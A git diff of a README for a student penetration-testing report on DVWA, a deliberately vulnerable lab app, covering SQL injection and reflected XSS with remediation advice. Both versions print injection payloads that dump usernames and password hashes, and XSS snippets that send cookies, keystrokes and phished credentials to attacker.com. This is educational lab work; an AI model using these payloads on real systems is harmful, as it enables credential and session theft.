@@ -1,108 +1,63 @@
 # Penetration Testing Report - DVWA
 
-> Comprehensive security assessment demonstrating SQL Injection and XSS exploitation techniques
+> Identifying and exploiting SQL Injection and XSS vulnerabilities in a controlled lab environment
 
 [![Security Testing](https://img.shields.io/badge/Security-Penetration%20Testing-red)](https://github.com/Fredrickighile/penetration-testing-dvwa)
 [![OWASP Top 10](https://img.shields.io/badge/OWASP-Top%2010-orange)](https://owasp.org/www-project-top-ten/)
-[![Vulnerabilities Found](https://img.shields.io/badge/Critical%20Findings-2-critical)](https://github.com/Fredrickighile/penetration-testing-dvwa)
 
-**Key Achievement:** Successfully identified and exploited critical SQL Injection and XSS vulnerabilities, demonstrating complete database compromise and client-side code execution.
-
-[See Exploitation](#vulnerability-findings) • [Tools Used](#tools-used) • [What I Learned](#what-i-learned)
+**Key Achievement:** Successfully identified and exploited critical SQL Injection (CVSS 9.8) and XSS vulnerabilities, extracted database credentials, and documented remediation strategies.
 
 ---
 
 ## Project Overview
 
-This penetration testing assessment was conducted on DVWA (Damn Vulnerable Web Application) to identify and exploit common web vulnerabilities. The testing revealed critical security flaws that could lead to complete system compromise and unauthorized data access.
+Conducted penetration testing on DVWA (Damn Vulnerable Web Application) to identify security vulnerabilities and demonstrate exploitation techniques. Testing revealed critical flaws allowing complete database access and client-side code execution.
 
-### Testing Objectives
+**Test Environment:**
 
-- Identify SQL injection vulnerabilities in database queries
-- Test for Cross-Site Scripting (XSS) attack vectors
-- Demonstrate real-world exploitation techniques
-- Document findings with visual proof-of-concept
-- Provide actionable remediation recommendations
-
----
-
-## Tools Used
-
-| Tool              | Version           | Purpose                                                        |
-| ----------------- | ----------------- | -------------------------------------------------------------- |
-| **DVWA**          | Latest            | Intentionally vulnerable web application for security training |
-| **XAMPP**         | 8.2.12            | Local web server environment (Apache + MySQL)                  |
-| **Google Chrome** | Latest            | Manual testing and payload injection                           |
-| **Burp Suite**    | Community Edition | HTTP request interception (planned for future testing)         |
+- Application: DVWA on XAMPP (Apache + MySQL)
+- Security Level: LOW
+- Testing Approach: Manual exploitation with systematic documentation
+- Date: January 11, 2026
 
 ---
 
-## Methodology
+## Vulnerabilities Discovered
 
-### Step 1: Environment Setup
+### 1. SQL Injection - CRITICAL (CVSS 9.8)
 
-Set up a controlled testing environment using XAMPP to host DVWA locally.
-
-**Setup:**
-
-- Installed XAMPP on Windows 11
-- Deployed DVWA to `C:\xampp\htdocs\dvwa`
-- Configured MySQL database with root credentials
-- Set DVWA security level to LOW for initial testing
-
-### Step 2: Reconnaissance
-
-Identified vulnerable input points and potential injection vectors.
-
-**Target Areas:**
-
-- SQL Injection module (`/vulnerabilities/sqli/`)
-- XSS Reflected module (`/vulnerabilities/xss_r/`)
-
-### Step 3: Vulnerability Testing
-
-Systematically tested input fields using various injection payloads.
-
-### Step 4: Exploitation & Documentation
-
-Successfully exploited vulnerabilities and captured evidence of compromise.
+**What I Found:** The application inserts user input directly into SQL queries without validation, allowing database manipulation through crafted input.
 
 ---
 
-## Vulnerability Findings
+#### Exploitation Steps
 
-### Finding 1: SQL Injection (CRITICAL)
-
-| Property       | Value                        |
-| -------------- | ---------------------------- |
-| **Severity**   | CRITICAL                     |
-| **CVSS Score** | 9.8                          |
-| **CWE**        | CWE-89                       |
-| **Impact**     | Complete database compromise |
-
-#### Technical Description
-
-The application fails to sanitize user input in SQL queries, allowing attackers to manipulate database operations and extract sensitive information.
-
-#### Exploitation Process
-
-**Test 1: Baseline Query**
+**Test 1: Baseline**
 
 Input: `1`
 
-Expected behavior: Returns user information for ID 1
+Result: Returns user ID 1 data (expected behavior)
 
-![Normal SQL Query](screenshots/sql-normal.png)
+![Normal Query](screenshots/sql-normal.png)
 
-**Test 2: Boolean-Based SQL Injection**
+---
+
+**Test 2: Boolean-Based Injection**
 
 Input: `1' OR '1'='1`
 
-Result: Bypassed query logic and extracted ALL users from the database
+**How this works:**
 
-![SQL Injection Success - All Users](screenshots/sql-all-users.png)
+- The single quote (`'`) closes the original SQL string
+- `OR '1'='1'` adds a condition that's always true
+- The query becomes: "SELECT \* FROM users WHERE id = '1' OR '1'='1'"
+- Since '1'='1' is always true, ALL users are returned
 
-**Successfully extracted:**
+Result: Extracted all users from database
+
+![All Users Dumped](screenshots/sql-all-users.png)
+
+**Users extracted:**
 
 - admin / admin
 - Gordon / Brown
@@ -110,246 +65,280 @@ Result: Bypassed query logic and extracted ALL users from the database
 - Pablo / Picasso
 - Bob / Smith
 
+---
+
 **Test 3: Database Enumeration**
 
 Input: `1' UNION SELECT NULL, database() #`
 
-Result: Disclosed database name: `dvwa`
+**How this works:**
 
-![Database Name Extraction](screenshots/sql-database-name.png)
+- `UNION` allows combining results from multiple queries
+- `database()` is a MySQL function that returns the current database name
+- `#` comments out the rest of the original query to avoid syntax errors
+
+Result: Database name disclosed as `dvwa`
+
+![Database Name](screenshots/sql-database-name.png)
+
+---
 
 **Test 4: Credential Extraction**
 
 Input: `1' UNION SELECT user, password FROM users #`
 
-Result: Successfully extracted usernames and MD5 password hashes
+**How this works:**
 
-![Captured Credentials](screenshots/captured-credentials.png)
+- Directly queries the users table
+- Selects username and password columns
+- Returns all credentials in the database
 
-**Password hashes extracted:**
+Result: Extracted all password hashes
 
-- `admin` → `5f4dcc3b5aa765d61d8327deb882cf99`
-- `gordonb` → `e99a18c428cb38d5f260853678922e03`
-- `1337` → `8d3533d75ae2c3966d7e0d4fcc69216b`
-- `pablo` → `0d107d09f5bbe40cade3de5c71e9e9b7`
-- `smithy` → `5f4dcc3b5aa765d61d8327deb882cf99`
+![Password Hashes](screenshots/captured-credentials.png)
 
-#### Security Impact
+**Credentials obtained:**
 
-| Impact Area              | Description                                             |
-| ------------------------ | ------------------------------------------------------- |
-| **Data Confidentiality** | All database contents can be read                       |
-| **Data Integrity**       | Database records can be modified or deleted             |
-| **Authentication**       | Login mechanisms can be bypassed                        |
-| **Authorization**        | Privilege escalation to administrative access           |
-| **Business Risk**        | Complete data breach, regulatory violations (GDPR/CCPA) |
+```
+admin  → 5f4dcc3b5aa765d61d8327deb882cf99 (MD5)
+gordonb → e99a18c428cb38d5f260853678922e03
+1337   → 8d3533d75ae2c3966d7e0d4fcc69216b
+pablo  → 0d107d09f5bbe40cade3de5c71e9e9b7
+smithy → 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+These MD5 hashes can be cracked using tools like hashcat or online databases.
 
 ---
 
-### Finding 2: Cross-Site Scripting (XSS) - Reflected
+#### Impact Assessment
 
-| Property       | Value                               |
-| -------------- | ----------------------------------- |
-| **Severity**   | HIGH                                |
-| **CVSS Score** | 7.3                                 |
-| **CWE**        | CWE-79                              |
-| **Impact**     | Session hijacking, phishing attacks |
+**Technical Impact:**
 
-#### Technical Description
+- Full database read access (all tables and data)
+- Potential write/delete capabilities
+- Authentication bypass (login without credentials)
+- Privilege escalation to admin level
 
-User input is reflected in the HTTP response without proper encoding, allowing injection of malicious JavaScript that executes in victims' browsers.
+**Business Impact:**
 
-#### Exploitation Process
-
-**Initial State:**
-
-![XSS Page Before Attack](screenshots/xss-before.png)
-
-**Payload Injection:**
-
-Input: `<script>alert('XSS Vulnerability!')</script>`
-
-**Execution Result:**
-
-The JavaScript successfully executed, proving arbitrary code execution in the browser context.
-
-![XSS After Execution](screenshots/xss-after.png)
-
-#### Attack Scenarios
-
-**Session Hijacking:**
-
-```javascript
-<script>
-  document.location='http://attacker.com/steal.php?cookie='+document.cookie;
-</script>
-```
-
-**Keylogger:**
-
-```javascript
-<script>
-document.onkeypress=function(e){
-  fetch('http://attacker.com/log?key='+e.key);
-}
-</script>
-```
-
-**Phishing Redirect:**
-
-```javascript
-<script>window.location='http://fake-login-site.com';</script>
-```
-
-#### Security Impact
-
-| Impact Area          | Description                                   |
-| -------------------- | --------------------------------------------- |
-| **Session Security** | Attackers can steal session tokens            |
-| **User Privacy**     | Keystroke logging and screen capture possible |
-| **Phishing**         | Users can be redirected to malicious sites    |
-| **Malware**          | Drive-by downloads can be triggered           |
-| **Business Risk**    | User account compromise, reputational damage  |
+- Complete data breach (user PII, passwords, payment data)
+- Regulatory violations (GDPR fines up to €20M or 4% revenue)
+- Reputational damage and loss of customer trust
+- Potential for ransomware/data extortion
 
 ---
 
-## Remediation Recommendations
+#### Remediation
 
-### For SQL Injection
-
-**Priority:** CRITICAL - Implement Immediately
-
-**1. Use Prepared Statements**
+**Primary Fix: Use Prepared Statements**
 
 ```php
-// Vulnerable Code
+// VULNERABLE (current implementation)
 $query = "SELECT * FROM users WHERE user_id = '$id'";
+$result = mysqli_query($connection, $query);
 
-// Secure Code
+// SECURE (recommended fix)
 $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
 $stmt->execute([$id]);
 ```
 
-**2. Input Validation**
+Prepared statements separate SQL code from data, preventing injection.
 
-- Validate data types (ensure user_id is integer)
-- Use allowlists for acceptable input patterns
-- Implement server-side validation
-- Reject input containing SQL keywords
+**Additional Defenses:**
 
-**3. Principle of Least Privilege**
-
-- Database accounts should have minimal permissions
-- Separate read/write database users
-- Disable dangerous SQL functions
-
-**4. Web Application Firewall (WAF)**
-
-- Deploy ModSecurity or similar WAF
-- Block common SQL injection patterns
-- Monitor and log suspicious queries
+- Input validation (verify user_id is numeric)
+- Least privilege database accounts (read-only when possible)
+- Web Application Firewall (ModSecurity or similar)
+- Regular security audits and code reviews
 
 ---
 
-### For Cross-Site Scripting (XSS)
+### 2. Cross-Site Scripting (XSS) - HIGH (CVSS 7.3)
 
-**Priority:** HIGH - Implement Within 7 Days
+**What I Found:** User input is displayed on the page without encoding, allowing JavaScript injection that executes in the browser.
 
-**1. Output Encoding**
+---
+
+#### Exploitation
+
+**Test: JavaScript Injection**
+
+Input: `<script>alert('XSS Vulnerability!')</script>`
+
+**What happens:**
+
+1. Application takes my input
+2. Embeds it directly in HTML without encoding
+3. Browser interprets `<script>` tags as code, not text
+4. My JavaScript executes
+
+**Before:**
+
+![XSS Before](screenshots/xss-before.png)
+
+**After:**
+
+![XSS After](screenshots/xss-after.png)
+
+The popup proves arbitrary code execution.
+
+---
+
+#### Real-World Attack Scenarios
+
+**Session Hijacking:**
+
+```javascript
+<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>
+```
+
+Sends victim's session cookie to attacker's server. Attacker can then impersonate the victim.
+
+**Keylogging:**
+
+```javascript
+<script>
+document.onkeypress = function(e) {
+  fetch('http://attacker.com/log?key=' + e.key);
+}
+</script>
+```
+
+Records every keystroke (passwords, credit cards, personal info).
+
+**Credential Theft:**
+
+```javascript
+<script>
+document.body.innerHTML = '<form action="http://attacker.com/phish">Username: <input name="user"><br>Password: <input name="pass" type="password"><br><button>Login</button></form>';
+</script>
+```
+
+Replaces page content with fake login form that sends credentials to attacker.
+
+---
+
+#### Impact Assessment
+
+**Technical Impact:**
+
+- Session token theft (account takeover)
+- Arbitrary JavaScript execution in user context
+- DOM manipulation (page defacement)
+- Credential harvesting through fake forms
+
+**Business Impact:**
+
+- Mass account compromise
+- Malware distribution to users
+- Phishing attacks using trusted domain
+- Loss of user confidence
+
+---
+
+#### Remediation
+
+**Primary Fix: Output Encoding**
 
 ```php
-// Vulnerable Code
+// VULNERABLE
 echo "Hello " . $_GET['name'];
 
-// Secure Code
+// SECURE
 echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
 ```
 
-**2. Content Security Policy (CSP)**
+`htmlspecialchars()` converts `<` to `&lt;`, so browsers display it as text instead of executing it as code.
 
-```html
-<meta
-  http-equiv="Content-Security-Policy"
-  content="default-src 'self'; script-src 'self'; object-src 'none';"
-/>
-```
+**Additional Defenses:**
 
-**3. HTTPOnly Cookies**
-
-```php
-setcookie("session", $value, [
-    'httponly' => true,
-    'secure' => true,
-    'samesite' => 'Strict'
-]);
-```
-
-**4. Input Sanitization**
-
-- Remove or encode special HTML characters
-- Use input validation libraries
-- Implement allowlist-based validation
+- Content Security Policy (CSP) headers to restrict script sources
+- HTTPOnly flag on cookies (prevents JavaScript access)
+- Input validation (reject suspicious patterns)
+- Use frameworks with auto-escaping (React, Angular, Vue)
 
 ---
 
-## Risk Assessment
+## Tools & Environment
 
-| Vulnerability   | Exploitability | Impact   | Overall Risk |
-| --------------- | -------------- | -------- | ------------ |
-| SQL Injection   | High           | Critical | CRITICAL     |
-| XSS (Reflected) | Medium         | High     | HIGH         |
+| Tool          | Purpose                                                        |
+| ------------- | -------------------------------------------------------------- |
+| DVWA          | Intentionally vulnerable web application for security training |
+| XAMPP 8.2.12  | Local web server (Apache + MySQL)                              |
+| Google Chrome | Manual testing and payload execution                           |
+| VS Code       | Documentation and report writing                               |
+
+---
+
+## Testing Methodology
+
+**Approach:**
+
+1. Information gathering (identify input points)
+2. Baseline testing (understand normal behavior)
+3. Injection testing (test various payloads)
+4. Exploitation (demonstrate impact)
+5. Documentation (screenshots and explanation)
+
+**Security Level:** LOW (basic defenses disabled for learning purposes)
 
 ---
 
 ## What I Learned
 
-Through this penetration testing exercise, I gained hands-on experience with:
+**Technical Skills:**
 
-- SQL injection identification and exploitation techniques
-- Boolean-based and UNION-based SQL injection attacks
-- Database enumeration and information disclosure
-- Cross-Site Scripting (XSS) attack vectors and payloads
-- Understanding OWASP Top 10 vulnerabilities in practice
-- Professional penetration testing methodology
-- Technical security report writing
-- Risk assessment and severity classification
-- Security remediation recommendations
+- SQL injection mechanics (boolean-based, UNION-based)
+- Database enumeration techniques
+- XSS exploitation and payload development
+- Security impact assessment
+- Vulnerability remediation strategies
+
+**Professional Skills:**
+
+- Penetration testing methodology
+- Technical report writing
+- Risk assessment and CVSS scoring
+- Proof-of-concept development
+- Clear communication of technical concepts
+
+---
+
+## Limitations & Future Work
+
+**Current Scope:**
+
+- Testing performed on LOW security level
+- Manual exploitation (no automated scanning)
+- Limited to SQL Injection and XSS modules
+
+**Next Steps:**
+
+- Test MEDIUM and HIGH security levels
+- Explore blind SQL injection techniques
+- Test additional DVWA modules (Command Injection, File Upload, CSRF)
+- Integrate Burp Suite for automated discovery
+- Develop custom Python exploit scripts
 
 ---
 
 ## Key Takeaways
 
-This assessment demonstrated:
-
-1. **Input Validation is Critical** - Never trust user input, always validate and sanitize
-2. **Defense in Depth** - Implement multiple security layers (WAF, input validation, output encoding)
-3. **Prepared Statements are Essential** - They prevent SQL injection attacks effectively
-4. **Output Encoding Prevents XSS** - Always encode user-generated content before display
-5. **Security by Design** - Build security into applications from the beginning
+1. **Input validation is critical** - Never trust user input
+2. **Use prepared statements** - They prevent 99% of SQL injection attacks
+3. **Encode all output** - XSS prevention requires proper output encoding
+4. **Defense in depth** - Multiple security layers reduce risk
+5. **Documentation matters** - Clear reports help teams fix vulnerabilities
 
 ---
 
-## Future Improvements
+## References
 
-- Test additional DVWA modules (Command Injection, File Upload, CSRF)
-- Perform testing at higher security levels (Medium, High)
-- Explore blind SQL injection techniques
-- Test stored XSS vulnerabilities
-- Integrate Burp Suite for automated scanning
-- Develop custom exploit scripts
-
----
-
-## Conclusion
-
-This penetration test successfully identified and exploited **two critical security vulnerabilities** in DVWA:
-
-1. **SQL Injection (CRITICAL):** Complete database compromise through unsanitized input, enabling credential theft and data exfiltration
-2. **Cross-Site Scripting (HIGH):** Client-side code execution allowing session hijacking and phishing attacks
-
-Both vulnerabilities demonstrate the critical importance of proper input validation and output encoding in web application security.
-
-**Key Message:** Even simple input validation failures can lead to catastrophic security breaches. Implementing secure coding practices and regular security testing is essential for protecting web applications.
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+- [XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [DVWA GitHub Repository](https://github.com/digininja/DVWA)
 
 ---
 
@@ -362,7 +351,7 @@ Cybersecurity Specialist
 [![GitHub](https://img.shields.io/badge/GitHub-Follow-black)](https://github.com/Fredrickighile)
 [![Portfolio](https://img.shields.io/badge/Portfolio-Visit-green)](https://fredrick-ighile.vercel.app/)
 
-**Contact:** fredrick.ighile.dev@gmail.com
+📧 fredrick.ighile@miva.edu.ng
 
 **Date Completed:** January 11, 2026
 
@@ -372,6 +361,6 @@ Cybersecurity Specialist
 
 **If this project helped you understand penetration testing, please star this repository!**
 
-[Back to Top](#penetration-testing-report---dvwa)
+[⬆ Back to Top](#penetration-testing-report---dvwa)
 
 </div>
